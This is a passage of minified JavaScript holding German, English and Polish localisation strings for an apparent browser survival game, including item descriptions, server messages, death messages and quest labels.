        ve[le.PLOT] = ["Topf", "Ernsthaft, benutz es", "Mit diesem GMO dünger deine Pflanzen", "lässt sie schneller wachsen und reduziert den Wasserverbrauch", "Haltbarkeit: 2000"];
        ve[le.ICE] = ["Eis", "Nützlich um Kuchen und Wasser herzustellen"];
        ve[le.SPANNER] = ["Schraubenschlüssel", "Es kann Wände, Türen und Stacheln reparieren", "Schaden: 2"];
        ve[le.FUR_WOLF] = ["Wolfsfell", "Welpe? Aber wo ist der Welpe?!"];
        ve[le.FUR] = ["Hasenfell", "Der Hase war so süß..."];
        ve[le.SPECIAL_FUR] = ["Klares Fell", "Du bist eine Brotfabrik"];
        ve[le.SPECIAL_FUR_2] = ["Dunkles Fell", "Du machst dich bereit etwas falsches zu vollführen"];
        ve[le.FUR_WINTER] = ["Winter Fell", "Diese Tiere wollten nur eine Umarmung..."];
        ve[le.SCALES] = ["Schuppen", "Es riecht wie Fisch!"];
        ve[le.KRAKEN_SKIN] = ["Kraken Haut", "Warst du nicht zu ängstlich?"];
        ve[le.FIRE] = ["Lagerfeuer", "Wärmt dich!", "Haltbarkeit: 150", "Lebensdauer: 2min"];
        ve[le.BIG_FIRE] = ["Großes Lagerfeuer", "Wärmt dich länger!", "Haltbarkeit: 400", "Lebensdauer: 6min"];
        ve[le.WORKBENCH] = ["Werkbank", "Sehr nützlich um allerlei Sachen herzustellen"];
        ve[le.CORD] = ["Faden", "Wird benötigt um Mützen und Rucksäcke herzustellen  "];
        ve[le.BLUE_CORD] = ["Diamant Faden", "Wird für spezielle Mützen gebraucht"];
        ve[le.CHEST] = ["Truhe", "Damit kannst du Gegenstände lagern", "Haltbarkeit: 500"];
        ve[le.SWORD_WOOD] = ["Holzschwert", "Funktioniert das?", "Schaden: 12", "Schaden an Gebäuden: 4"];
        ve[le.SWORD] = ["Steinschwert", "Sei nett zu Anderen", "Schaden: 19", "Schaden an Gebäuden: 6"];
        ve[le.SWORD_GOLD] = ["Goldschwert", "König des Waldes", "Schaden: 22", "Schaden an Gebäuden: 7"];
        ve[le.SWORD_DIAMOND] = ["Diamantschwert", "Du kannst die Kraft spüren", "Schaden: 24", "Schaden an Gebäuden: 8"];
        ve[le.PIRATE_SWORD] = ["Piratenschwert", "Ayyyyy!", "Hat eine höhere Reichweite als ein normales Schwert", "Schaden: 24", "Schaden an Gebäuden: 8"];
        ve[le.SWORD_AMETHYST] = ["Amethystschwert", "Mauve ist die schönste Farbe der Welt", "Schaden: 27", "Schaden an Gebäuden: 9"];
        ve[le.DRAGON_SWORD] = ["Drachenschwert", "Keine Gnade!", "Schaden: 30", "Schaden an Gebäuden: 10"];
        ve[le.DRAGON_SPEAR] = ["Drachenspeer", "Töte sie alle!", "Schaden: 22", "Schaden an Gebäuden: 6"];
        ve[le.PICK_WOOD] = ["Holzspitzhacke", "Kann nur Holz und Stein abbauen", "Schaden: 1"];
        ve[le.PICK] = ["Steinspitzhacke", "Kann Holz, Stein und Gold abbauen", "Schaden: 2"];
        ve[le.PICK_GOLD] = ["Goldspitzhacke", "Kann auch Diamanten abbauen", "Schaden: 3", "Schaden an Gebäuden: 1"];
        ve[le.PICK_DIAMOND] = ["Diamantspitzhacke", "Kann alles abbauen", "Schaden: 4", "Schaden an Gebäuden: 1"];
        ve[le.PICK_AMETHYST] = ["Amethystspitzhacke", "Kann alles abbauen, sieht außerdem gut aus!", "Schaden: 5", "Schaden an Gebäuden: 1"];
        ve[le.HAMMER] = ["Steinhammer", "Nützlich um Gebäude zu zerstören", "Funktioniert nicht gut gegen Diamant oder Amethyst", "Schaden: 2", "Schaden an Gebäuden: 20"];
        ve[le.HAMMER_GOLD] = ["Goldhammer", "Nützlich um Gebäude zu zerstören", "Funktioniert nicht gut gegen Amethyst", "Schaden: 3", "Schaden an Gebäuden: 30"];
        ve[le.HAMMER_DIAMOND] = ["Diamanthammer", "Nützlich um Gebäude zu zerstören", "Schaden: 4", "Schaden an Gebäuden: 40"];
        ve[le.HAMMER_AMETHYST] = ["Amethysthammer", "Nützlich um Gebäude zu zerstören", "Schaden: 5", "Schaden an Gebäuden: 50"];
        ve[le.SUPER_HAMMER] = ["Superhammer", "Willst du die Welt zerstören?", "Schaden: 12", "Schaden an Gebäuden: 70"];
        ve[le.WOOD_SPEAR] = ["Holzspeer", "Wie ein Stock, nur mit dem Unterschied, dass es sticht.", "Schaden: 10", "Schaden an Gebäuden: 2"];
        ve[le.SPEAR] = ["Steinspeer", "Der Anfang der Evolution!", "Schaden: 14", "Schaden an Gebäuden: 4"];
        ve[le.GOLD_SPEAR] = ["Goldspeer", "Pass auf, es sticht!", "Schaden: 15", "Schaden an Gebäuden: 5"];
        ve[le.DIAMOND_SPEAR] = ["Diamantspeer", "Du bist bereit einen Drachen zu töten", "Schaden: 17", "Schaden an Gebäuden: 5"];
        ve[le.AMETHYST_SPEAR] = ["AmethystSpeer", "Drachen jagen dir keine Angst mehr ein", "Schaden: 18", "Schaden an Gebäuden: 6"];
        ve[le.SHOVEL] = ["Steinschaufel", "Grab herum um Dreck, Eis und Sand zu bekommen", "Du kannst auch Mineralien bekommen", "Schaden: 2"];
        ve[le.SHOVEL_GOLD] = ["Goldschaufel", "Grab herum um Dreck, Eis und Sand zu bekommen", "Du kannst auch Mineralien bekommen", "Schaden: 3", "Schaden an Gebäuden: 1"];
        ve[le.SHOVEL_DIAMOND] = ["Diamantschaufel", "Grab herum um Dreck, Eis und Sand zu bekommen", "Du kannst auch Mineralien bekommen", "Schaden: 4", "Schaden an Gebäuden: 1"];
        ve[le.SHOVEL_AMETHYST] = ["Amethystschaufel", "Grab herum um Dreck, Eis und Sand zu bekommen", "Du kannst auch Mineralien bekommen", "Schaden: 5", "Schaden an Gebäuden: 1"];
        ve[le.WOOD_HELMET] = ["Holzhelm", "Besser als nichts", "Verteidigung gegen Spieler: 1", "Verteidigung gegen Tiere: 4"];
        ve[le.STONE_HELMET] = ["Steinhelm", "Du bist bereit zu kämpfen!", "Verteidigung gegen Spieler: 2", "Verteidigung gegen Tiere: 8"];
        ve[le.GOLD_HELMET] = ["Goldhelm", "AKA Der Helm der Unbarmherzigen", "Verteidigung gegen Spieler: 4", "Verteidigung gegen Tiere: 13"];
        ve[le.DIAMOND_HELMET] = ["Diamanthelm", "Gib nicht zu viel an", "Verteidigung gegen Spieler: 5", "Verteidigung gegen Tiere: 19"];
        ve[le.AMETHYST_HELMET] = ["Amethysthelm", "Du musst vor nichts mehr angst haben", "Verteidigung gegen Spieler: 6", "Verteidigung gegen Tiere: 23"];
        ve[le.DRAGON_HELMET] = ["Drachenhelm", "Du wirst die Welt erobern", "Verteidigung gegen Spieler: 8", "Verteidigung gegen Tiere: 27"];
        ve[le.EXPLORER_HAT] = ["Erkunderhut", "Tiere beachten dich nicht mehr", "mach aber keine Geräusche!", "Hält dich warm außerhalb von Wasser und Winter"];
        ve[le.CHRISTMAS_HAT] = ["Weihnachtshut", "Oh, oh, oh, fröhliche Weihnachten", "Hält dich warm außerhalb von Wasser und Winter"];
        ve[le.ELF_HAT] = ["Elfenhut", "Lass dich nicht ausnutzen, du kleiner Schneeelf!", "Hält dich warm außerhalb von Wasser und Winter"];
        ve[le.HOOD] = ["Kapuze", "Du bist ein Schurke", "Du kannst jemand bestehlen solange:", "1) Es nacht ist", "2) Du nichts trägst", "3) dich niemand für acht Sekunden berührt hat", "4) Du nicht in der Nähe eines Feuers bist", "5) Dein Ziel keine Bauernkleidung trägt", "Hält dich warm außerhalb von Wasser und Winter"];
        ve[le.EARMUFFS] = ["Ohrwärmer", "Eine Art kleiner chapka.", "Hält dich warm außerhalb von Wasser und Winter"];
        ve[le.COAT] = ["Chapka", "Auch Mantel genannt.", "Hält dich warm außerhalb von Wasser und Winter"];
        ve[le.CAP_SCARF] = ["Winterschaal und Kappe", "Sehr angenehm", "Sehr Warm"];
        ve[le.PEASANT] = ["Bauer", "Deine Pflanzen wachsen schneller", "Hält dich warm außerhalb von Wasser und Winter"];
        ve[le.WINTER_HOOD] = ["Winterkapuze", "Du bist ein Wilder Schurke", "Du kannst jemand bestehlen solange:", "1) Es nacht ist", "2) Du nichts trägst", "3) dich niemand für vier Sekunden berührt hat", "4) Du nicht in der Nähe eines Feuers bist", "5) Dein Ziel keine Winterbauernkleidung trägt", "Hält dich warm außerhalb von Wasser und Winter"];
        ve[le.WINTER_PEASANT] = ["Winterbauern", "Deine Pflanzen wachsen deutlich schneller", "Hält dich warm außerhalb von Wasser und Winter"];
        ve[le.DIVING_MASK] = ["Tauchermaske", "Du bist schneller im Wasser", "Hält dich warm im Wasser", "Verteidigung gegen Spieler: 2, Verteidigung gegen Tiere: 8"];
        ve[le.SUPER_DIVING_SUIT] = ["Supertauchermaske", "Du bist sehr schnell im Wasser", "Hält dich warm im Wasser", "Verteidigung gegen Spieler: 4, Verteidigung gegen Tiere: 16"];
        ve[le.DRAGON_ORB] = ["Drachenkugel", "Erhalten bei abschließung der Quest"];
        ve[le.DRAGON_HEART] = ["Drachenherz", "Verwandelt dich in einen Geist, sobald du stirbst!", "Du bist für 60 Sekunden ein Geist", "Finde ein Wiederbelebungsstein."];
        ve[le.GEMME_GREEN] = ["Grüner Edelstein", "Du hast nicht gemogelt, versprochen?"];
        ve[le.GEMME_ORANGE] = ["Orangener Edelstein", "Nur ein echter Pirat findet ihn!"];
        ve[le.GEMME_BLUE] = ["Blauer Edelstein", "Für sehr nette Leute"];
        ve[le.CROWN_GREEN] = ["Grüne Krone", "Du heilst dich selbst sehr schnell", "Heilung über Zeit: 40", "Verteidigung gegen Spieler: 4, Verteidigung gegen Tiere: 16"];
        ve[le.CROWN_ORANGE] = ["Orangene Krone", "Du fühlst dich plötzlich als hättest du mehr Glück", "Verteidigung gegen Spieler: 4, Verteidigung gegen Tiere: 16"];
        ve[le.CROWN_BLUE] = ["Blaue Krone", "Sobald du stirbst wirst du ein Geist", "Du wirst allerdings dein Schwert und deine Spitzhacke verlieren", "Verteidigung gegen Spieler: 4, Verteidigung gegen Tiere: 16"];
        ve[le.BUCKET_FULL] = ["Eimer", "Nützlich um einen Brunnen zu füllen", "Ein Eimer ist vergleichbar mit zwölf Flaschen"];
        ve[le.BUCKET_EMPTY] = ["Leerer Eimer", "Du musst den Eimer in der Nähe einer Wasserquelle füllen"];
        ve[le.BOTTLE_FULL] = ["Flasche", "Erlaubt dir überall Wasser zu trinken", "Wasser: 50"];
        ve[le.BOTTLE_EMPTY] = ["Leere Flasche", "Du musst die Flasche in der Nähe einer Wasserquelle füllen"];
        ve[le.WATERING_CAN] = ["Leere Gießkanne", "Du musst es mit einer Wasserquelle füllen"];
        ve[le.WATERING_CAN_FULL] = ["Gießkanne", "Erlaubt das wässern von Pflanzen", "Schaden: 1"];
        ve[le.BAG] = ["Rucksack", "Mehr Platz im Inventar!"];
        ve[le.PAPER] = ["Papier", "Wird fürs Büchermachen verwendet"];
        ve[le.BOOK] = ["Buch", "Reduziert die benötigte Zeit beim herstellen von Gegenständen", "Muss in der Hand gehalten werden um den Effekt zu nutzen", "Schaden: 1"];
        ve[le.BANDAGE] = ["Verband", "Heile dich schneller", "Heilung über Zeit: 30", "Effekt: 5"];
        ve[le.LOCK] = ["Schloss", "Erlaubt dir deine Truhe zu verschließen"];
        ve[le.LOCKPICK] = ["Dietrich", "Erlaubt dir eine verschlossene Truhe zu öffnen"];
        ve[le.TOTEM] = ["Totem", "Erlaubt dir ein Team zu gründen", "Teile Türen und Truhen", "verletzende Strukturen schaden deinen Freunden nicht mehr"];
        ve[le.BRIDGE] = ["Brücke", "Sehr nützlich über Wasser", "Es erlaubt dir zu trinken ohne zu ertrinken", "lässt dich schneller auf dem Wasser laufen"];
        ve[le.SIGN] = ["Schild", "Hinterlasse eine Nachricht für andere hier", "Haltbarkeit: 200"];
        ve[le.ROOF] = ["Dach", "Versteckt dich ein wenig und hält warm dabei!"];
        ve[le.WELL] = ["Brunnen", "Erlaubt dir deine Flasche zu füllen, eine mobile Wasserquelle", "Haltbarkeit: 1000"];
        ve[le.WALL] = ["Holzwand", "Kennst du den Wandtanz?", "Haltbarkeit: 1000"];
        ve[le.STONE_WALL] = ["Steinwand", "Es sieht ein wenig Ernsthafter aus.", "Haltbarkeit: 1500"];
        ve[le.GOLD_WALL] = ["Goldwand", "Gold an deiner Wand? Es leuchtet ein wenig.", "Haltbarkeit: 2000"];
        ve[le.DIAMOND_WALL] = ["Diamantwand", "So leuchtend, pass auf deine Augen auf", "Haltbarkeit: 2500"];
        ve[le.AMETHYST_WALL] = ["Amethystwand", "Du musst dich wirklich fürchten raus zu gehen!", "Haltbarkeit: 3000"];
        ve[le.SPIKE] = ["Holzstacheln", "Kann deine Gegner verletzen", "Schaden: 10, Schaden beim Angreifen: 2", "Haltbarkeit: 150"];
        ve[le.STONE_SPIKE] = ["Steinstacheln", "Ich würde lieber nicht dein Gegner sein.", "Schaden: 20", "Schaden beim Angreifen: 3", "Haltbarkeit: 300"];
        ve[le.GOLD_SPIKE] = ["Goldstacheln", "Du bist grausam.", "Schaden: 30", "Schaden beim Angreifen: 3", "Haltbarkeit: 600"];
        ve[le.DIAMOND_SPIKE] = ["Diamantstacheln", "Du magst Gesellschaft nicht.", "Schaden: 40", "Schaden beim Angreifen: 4", "Haltbarkeit: 1200"];
        ve[le.AMETHYST_SPIKE] = ["Amethyststacheln", "Was zur Hölle haben deine Nachbarn dir angetan?", "Schaden: 50", "Schaden beim Angreifen: 4", "Haltbarkeit: 2400"];
        ve[le.WOOD_DOOR] = ["Holztür", "Kann von dir oder deinen Freunden geöffnet werden", "Haltbarkeit: 1000"];
        ve[le.STONE_DOOR] = ["Steintür", "Eine stärkere Tür ist ernsthafter", "Haltbarkeit: 1500"];
        ve[le.GOLD_DOOR] = ["Goldtür", "Baust du el dorado?", "Haltbarkeit: 2000"];
        ve[le.DIAMOND_DOOR] = ["Diamanttür", "Für ein scheinendes Haus", "Haltbarkeit: 2500"];
        ve[le.AMETHYST_DOOR] = ["Amethysttür", "Ist dein Haus ein verschlossener Safe?", "Haltbarkeit: 3500"];
        ve[le.FURNACE] = ["Ofen", "Wärmt dich", "Es verbraucht alle 5 Sekunden eine Einheit Holz", "Haltbarkeit: 1000"];
        ve[le.WINDMILL] = ["Windmühle", "Kann mit Weizen, Mehl herstellen", "Es braucht 5 Sekunden um Mehl herzustellen", "Gibt dir Punkte während es arbeitet", "Haltbarkeit: 2000"];
        ve[le.BREAD_OVEN] = ["Brotofen", "Erlaubt dir mit Mehl, Brot herzustellen", "Es braucht 5 Sekunden um Brot herzustellen", "Gibt dir Punkte während es arbeitet", "Haltbarkeit: 2000"];
        ve[le.RESURRECTION] = ["Wiederbelebungsstein", "Es ist Magie", "Wiederbelebt dich, wenn du ein Geist bist", "Du wirst deine Waffe und Spitzhacke verlieren", "Haltbarkeit: 200"];
        ve[TEXT.YOU_CANNOT_JOIN] = "Du kannst diesem Server nicht beitreten";
        ve[TEXT.KICKED] = "Gekickt: ";
        ve[TEXT.KEY_ALREADY] = "Dein Schlüssel wurde bereits von jemand anderem benutzt";
        ve[TEXT.KEY_WRONG] = "Dein Schlüssel ist falsch";
        ve[TEXT.OLD_VERSION] = "Deine Version ist veraltet, säubere dein Cache";
        ve[TEXT.NO_MORE_RESOURCES] = "Es gibt keine neuen Ressourcen";
        ve[TEXT.SURVIVED_1DAY] = "Du hast einen Tag überlebt";
        ve[TEXT.SURVIVED] = "Du hast überlebt ";
        ve[TEXT.DAYS] = " Tage";
        ve[TEXT.DEAD_SAD] = "Du bist gestorben ;-;";
        ve[TEXT.SPAM_ME] = "Server kann kein Spawnplatz finden! Drücke immer wieder auf spielen!";
        ve[TEXT.SPAM_ME2] = "Server ist voll! Drücke immer wieder auf spielen!";
        ve[TEXT.EMPTY] = "Ressource ist leer";
        ve[TEXT.INV_FULL] = "Dein Inventar ist voll (rechts-klick um Gegenstände zu entfernen)";
        ve[TEXT.DEAD] = " ist gestorben";
        ve[TEXT.WRONG_TOOL] = "Das ist nicht das richtige Werkzeug";
        ve[TEXT.JOIN_TEAM] = "Du bist einem Team beigetreten";
        ve[TEXT.YOU_DEAD] = "Du bist gestorben";
        ve[TEXT.JOINED_TEAM] = " ist dem Team beigetreten";
        ve[TEXT.TEAM_DESTROYED] = "Dein Team wurde zerstört";
        ve[TEXT.LEFT_TEAM] = "Du hast das Team verlassen";
        ve[TEXT.LEFT_TEAM2] = " hat das Team verlassen";
        ve[TEXT.TOKEN] = "Jemand hat dein Token gestohlen :>";
        ve[TEXT.CHOOSE] = "Suche dir ein Server aus";
        ve[TEXT.PLAYERS] = "Spieler";
        ve[TEXT.TOTAL_PLAYERS] = "alle Spieler";
        ve[TEXT.TOTAL_MODE] = "Spieler in diesem Modus";
        ve[TEXT.COMMING_SOON] = "Bald verfügbar...";
        document.getElementById("nickname_input").placeholder = "Spitzname";
        Le[0] = ["Du wurdest ohne Grund getötet"];
        Le[1] = ["Du bist verhungert, wie der Name des Spiels andeutet"];
        Le[2] = ["Du bist erfroren. Zu schade", "Du bist an Unterkühlung gestorben. Versuche nächstes Mal zu einem Feuer zu gehen ."];
        Le[3] = ["Ein Spieler hat dich getötet, während er dir gesagt hat 'git gud.'", "Du wurdest von einem Spieler ermordet, mach dir keine Sorgen, er wird wahrscheinlich auch sterben ."];
        Le[4] = ["Du bist zu nah ans Feuer gegangen und zu tode gebrannt. Schlechte Idee.", "Du wurdest von einem Feuer umgebracht. Feuer tut weh. Schreib eine Geschichte darüber."];
        Le[5] = ["Dein Körper wird zu einem Spinnennest", "Eine Spinne hat dich getötet. Zumindest war es kein Hase."];
        Le[6] = ["Dieser Wolf wird nicht mehr verhungern", "Sie sind keine Hunde. Wölfe mögen es nicht gestreichelt zu werden."];
        Le[7] = ["Der Fuchs war zu schnell für dich", "Der Fuchs hat dich in eine Box verwandelt. Seit wann haben Tiere magische Kräfte?"];
        Le[8] = ["Der Bär wollte nur eine Umarmung.", "Der Bär war zu viel zu ertragen. Es tut mir nicht leid."];
        Le[9] = ["Du wurdest von einem Drachen knusprig gebraten. Zu schade.", "Du wurdest von einem Drachen erdrückt. Zerquetscht zu werden ist ein schrecklicher Weg zu sterben."];
        Le[10] = ["Du bist in eine Stachelwand gesprungen. Keine gute Idee...", "Du wurdest von einer Stachelwand getötet. Die meisten Leute sind sensibel genug keine spitzen Sachen anzufassen."];
        Le[11] = ["Sogar Geister können sterben.", "Du hast es nicht geschafft wiederbelebt zu werden. Das ist ein Spiel, also lebst du nachdem du stirbst..."];
        Le[12] = ["Ein Bakterium von deinem rohen Fleisch hat dich getötet. Das Spiel ist definitiv zu schwierig.", "Du hast das rohe Fleisch getötet. Es hat dich ebenfalls getötet."];
        Le[13] = ["Du bist verdurstet. Solltest lieber deinen eigenen Urin trinken."];
        Le[14] = ["Wusstest du, dass dein Mund beim Schwimmen immer unterm Wasser ist? Jetzt weißt du es."];
        Le[15] = ["Mach dir keine Sorge, der Piranha findet dich lecker.", "Nebenbei: Piranhas essen Menschen. Dich mit eingeschlossen."];
        Le[16] = ["LapaMauve plant nicht, dass du den Kraken töten kannst", "Ein Kraken hat deinen Schädel zertrümmert."];
        Le[17] = ["Deine Haut fällt auseinander, die Sonne hat dich umgebracht."];
        Le[18] = ["Knoblauch in deiner Tasche hat dein Gehirn gebraten "];
        Le[19] = ["Stehe als ein Vampir nicht neben den Knoblauchnelken."];
        Le[20] = ["Du hast als ein Vampir Knoblauch gegessen, was hast du erwartet?"];
        Le[21] = ["Dein Körper ist von einem Dornenbusch umgeben.Während du versuchst zu entkommen löst sich deine Haut von deinem Körper und dein Herz hört auf zu schlagen."];
        ZOMBIE_GRUMBLE = "Uuunnnggg";
        ZOMBIE_GRUMBLES = ["Uuunnnggg...Ich verhungere...", "Brauche dein Gehirn... Uuunnnggg...", "Hier gibt es frisches Fleisch... Uuunnnggg", "Uuunnnggg...Du bist lecker", "Uuunnnggg...", "Essen... uuunnnggg...", "Ich rieche Blut... Uuunnnggg"];
      }, pe = function () {
        ve[le.DRAGON_CUBE] = ["You feel a great power emanating from this orb"];
        Le[22] = ["This crab, though frightening in nature, pinched your fingertips so hard that you had a heart attack."];
        ve[le.CRAB_STICK] = ["Crab sticks", "Oh, yeah? Is there crab in the crab sticks?", "Food: 20"];
        ve[TEXT.BACK_TO_THE_GAME] = " BACK TO THE GAME";
        ve[TEXT.TWITTER] = " Share on Twitter";
        ve[TEXT.FACEBOOK] = " Share on Facebook";
        ve[TEXT.KIT_NEXT] = "You can buy items on the shop in the next game with your points";
        ve[TEXT.POINTS] = "points";
        ve[TEXT.SCORE] = "Score";
        ve[TEXT.KILL] = "Kill";
        ve[TEXT.DAYS_SURVIVED] = "Days survived";
        ve[TEXT.MODE_FREE] = "Building method: Free. Press G to change";
        ve[TEXT.MODE_GRID] = "Building method: Grid. Press G to change";
        ve[le.CRAB_LOOT] = ["Crab Claw", "Crab claws can also be eaten", "Food: 10"];
        ve[le.CRAB_SPEAR] = ["Crab Spear", "Allow you to calm crabs, and heal them", "Damage: 14", "Building Damage: 4"];
        ve[le.CROWN_CRAB] = ["Crab Helmet", "You are the king of crabs!", "Crabs follow you", "They can't hit you and you can't hit them", "Players Defense: 4", "Animals Defense: 13"];
        ve[le.BED] = ["Bed", "Relax in this confortable bed", "You are less cold, less thirsty, and less hungry", "You will be cured faster", "Durability: 400"];
        document.getElementById("typequest").innerHTML = "Chrono Quests";
        document.getElementById("timeremainingquest").innerHTML = "Time Remaining";
        document.getElementById("constraintquest").innerHTML = " Constraints";
        document.getElementById("claim_rewards").innerHTML = " Claim rewards";
        document.getElementById("rewardquest").innerHTML = " Reward";
        document.getElementById("killdragon_1").innerHTML = " Collect 1 dragon heart";
        document.getElementById("amethyst_2").innerHTML = " Gather 1 amethyst";
        document.getElementById("survive20min_3").innerHTML = "Survive without losing life";
        document.getElementById("treasure_chest_4").innerHTML = " Open 5 treasure chests";
        document.getElementById("dont_hit_5").innerHTML = " Be peaceful";
        document.getElementById("bread_6").innerHTML = " Collect 100 bread in deep winter";
        document.getElementById("winter_7").innerHTML = " After 1 day, survive in winter";
        for (var e = 0; e < 7; e++) {
          document.getElementById("claim_reward_" + e).innerHTML = "CLAIM REWARD!";
        }
        document.getElementById("quit_chronoquest").innerHTML = " QUIT";
        ve[le.HAND] = ["Ręka"];
        ve[le.GROUND] = ["Ziemia", "Brudna!"];
        ve[le.SAND] = ["Piasek", "Mam go w oczach!"];
        ve[le.WOOD] = ["Drewno", "Nie możesz mieć go wystarczająco!"];
        ve[le.STONE] = ["Kamień", "Także nazywany skałą"];
        ve[le.GOLD] = ["Złoto", "Bądź hojny, daj trochę innym"];
        ve[le.DIAMOND] = ["Diament", "Co z nim zrobisz?"];
        ve[le.AMETHYST] = ["Ametyst", "Jest Fiołkowy jak Lapa"];
        ve[le.FLOUR] = ["Mąka", "Używana w gotowaniu"];
        ve[le.COOKIE] = ["Ciastko", "Przepyszne ciasteczko od babci", "Jedzenie: 50"];
        ve[le.CAKE] = ["Ciasto", "Raj dla smakoszy", "Jedzenie: 100"];
        ve[le.MEAT] = ["Surowe mięso", "Możesz je upiec w ogniu", "Powoduje zatrucie pokarmowe: 10", "Jedzenie: 15"];
        ve[le.COOKED_MEAT] = ["Pieczone mięso", "Krwisty stek, proszę", "Jedzenie: 35"];
        ve[le.FOODFISH] = ["Surowa ryba", "Myślę, że nadal jest żywa", "Powoduje zatrucie pokarmowe: 10", "Jedzenie: 18"];
        ve[le.FOODFISH_COOKED] = ["Pieczona ryba", "Z cytryną jest idealna", " Jedzenie: 35"];
        ve[le.BREAD] = ["Chleb", "Świetny Francuski chleb", "Jest walutą używaną w markecie", "Jedzenie: 15"];
        ve[le.SANDWICH] = ["Kanapka", "Smakuje jak kraboburger", "Jedzenie: 100"];
        ve[le.CANDY] = ["Cukierki", "Tylko dla dzieci!", "Jedzenie: 100"];
        ve[le.SUGAR_CAN] = ["Laska cukrowa", "Spróbuj, jest przepyszna", "Jedzenie: 100"];
        ve[le.GARLAND] = ["Girlanda", "Idealna do dekorowania dachów"];
        ve[le.SEED] = ["Nasionko jagody", "Wyrośnie w jagody", "Narodziny: 2min", "Rośnięcie: 55s", "Podlewanie: 3min 20s", "Wytrzymałość: 700", "Czas życia: 8 dni"];
        ve[le.PLANT] = ["Jagody", "Jagody są pyszne!", "Jedzenie: 10"];
        ve[le.WHEAT_SEED] = ["Nasiono pszenicy", "Wyrośnie w pszenicę", "Narodziny: 2min", "Rośnięcie: 16s", "Podlewanie: 2min", "Wytrzymałość: 700", "Czas życia: 8 dni"];
        ve[le.WILD_WHEAT] = ["Pszenica", "Zamienia się w mąkę jeżeli wrzucisz ją do wiatraka"];
        ve[le.PUMPKIN_SEED] = ["Nasiono dyni", "Wyrośnie w dynię", "Narodziny: 2min 40s", "Rośnięcie: 2min", "Podlewanie: 2min", "Wytrzymałość: 700", "Czas życia: 8 dni"];
        ve[le.PUMPKIN] = ["Dynia", "Przypomina mi o Halloween", "Jedzenie: 30"];
        ve[le.GARLIC_SEED] = ["Nasionko czosnku", "Bardzo niebezpieczne dla wampirów", "Obrażenia: 20", "Narodziny: 4min", "Rośnięcie: 1min 10s", "Podlewanie: 1min 40s", "Wytrzymałość: 700", "Czas życia: 8 dni"];
        ve[le.GARLIC] = ["Czosnek", "Leczy cię i redukuje zimno", "Jedzenie: 14", "Uzdrawia z biegiem czasu: 30", "Efekt: 1"];
        ve[le.THORNBUSH_SEED] = ["Nasiono kolczastego krzewu", "Może zranić twoich wrogów", "Obrażenia: 20", "Narodziny: 4min", "Rośnięcie: 15s", "Podlewanie: 3min", "Wytrzymałość: 1000", "Czas życia: 8 dni"];
        ve[le.THORNBUSH] = ["Kolczasty krzew", "Kłuje!"];
        ve[le.PLOT] = ["Donica", "Naprawdę, użyj jej", "Z tym genetycznie modyfikowanym nawozem, twoje rośliny", "będą rosły znacznie szybciej i będą potrzebować mniej wody", "Wytrzymałość: 2000"];
        ve[le.ICE] = ["Lód", "Użyteczny do robienia ciast i wody"];
        ve[le.SPANNER] = ["Klucz mechaniczny", "Do naprawiania drzwi i kolców", "Uszkodzenie: 2"];
        ve[le.FUR_WOLF] = ["Wilcza skóra", "Szczeniaczek? Ale gdzie jest szczeniaczek?!"];
        ve[le.FUR] = ["Skóra królika", "Ten królik był taki słodziutki..."];
        ve[le.SPECIAL_FUR] = ["Skóra", "Jesteś fabryką chleba"];
        ve[le.SPECIAL_FUR_2] = ["Ciemna skóra", "Byłeś gotowy zrobić coś złego"];
        ve[le.FUR_WINTER] = ["Zimowa skóra", "Te zwierzęta chciały się tylko przytulić..."];
        ve[le.SCALES] = ["Łuski", "Pachnie jak ryba!"];
        ve[le.KRAKEN_SKIN] = ["Skóra krakena", "Nie byłeś zbyt przestraszony?"];
        ve[le.FIRE] = ["Ognisko", "Ociepli cię!", "Wytrzymałość: 150", "Czas życia: 2min"];
        ve[le.BIG_FIRE] = ["Duże ognisko", "Ociepli cię na dłużej!", "Wytrzymałość: 400", "Czas życia: 6min"];
        ve[le.WORKBENCH] = ["Stół rzemieślniczy", "Użyteczny do stwarzania przedmiotów"];
        ve[le.CORD] = ["Nić", "Używany w tworzeniu czapek i plecaków"];
        ve[le.BLUE_CORD] = ["Diamentowa nić", "Używana w tworzeniu specjalnych czapek"];
        ve[le.CHEST] = ["Skrzynia", "Pozwala ci na przechowywanie przedmiotów", "Wytrzymałość: 500"];
        ve[le.SWORD_WOOD] = ["Drewniany miecz", "To coś działa?", "Obrażenia: 12", "Obrażenia do budowli: 4"];
        ve[le.SWORD] = ["Kamienny miecz", "Bądź miły dla innych", "Obrażenia: 19", "Obrażenia do budowli: 6"];
        ve[le.SWORD_GOLD] = ["Złoty miecz", "Król lasu", "Obrażenia: 22", "Obrażenia do budowli: 7"];
        ve[le.SWORD_DIAMOND] = ["Diamentowy miecz", "Możesz poczuć moc", "Obrażenia: 24", "Obrażenia do budowli: 8"];
        ve[le.PIRATE_SWORD] = ["Piracki miecz", "Ayyyyy!", "Dłuższy niż zwykły miecz", "Obrażenia: 24", "Obrażenia do budowli: 8"];
        ve[le.SWORD_AMETHYST] = ["Ametystowy miecz", "fiołkowy to najpiękniejszy kolor na świecie", "Damage: 27", "Obrażenia do budowli: 9"];
        ve[le.DRAGON_SWORD] = ["Smoczy miecz", "Bez litości!", "Obrażenia: 30", "Obrażenia do budowli: 10"];
        ve[le.DRAGON_SPEAR] = ["Smocza włócznia", "Zabij ich wszystkich!", "Obrażenia: 22", "Obrażenia do budowli: 6"];
        ve[le.PICK_WOOD] = ["Drewniany kilof", "Może wydobywać tylko kamienie i drewno", "Obrażenia: 1"];
        ve[le.PICK] = ["Kamienny kilof", "Może wydobywać drewno, kamienie i złoto", "Obrażenia: 2"];
        ve[le.PICK_GOLD] = ["Złoty kilof", "Może także wydobywać diamenty", "Obrażenia: 3", "Obrażenia do budowli: 1"];
        ve[le.PICK_DIAMOND] = ["Diamentowy kilof", "Może wydobywać wszystko", "Obrażenia: 4", "Obrażenia do budowli: 1"];
        ve[le.PICK_AMETHYST] = ["Ametystowy kilof", "Może wydobywać wszystko. Wygląda fantastycznie!", "Obrażenia: 5", "Obrażenia do budowli: 1"];
        ve[le.HAMMER] = ["Kamienny młot", "Pomocny w niszczeniu budowli", "Nie działa najlepiej na ametyście", "Obrażenia: 2", "Obrażenia do budowli: 20"];
        ve[le.HAMMER_GOLD] = ["Złoty młot", "Pomocny w niszczeniu budowli", "Nie działa najlepiej na ametyście", "Obrażenia: 3", "Obrażenia do budowli: 30"];
        ve[le.HAMMER_DIAMOND] = ["Diamentowy młot", "Pomocny w niszczeniu budowli", "Obrażenia: 4", "Obrażenia do budowli: 40"];
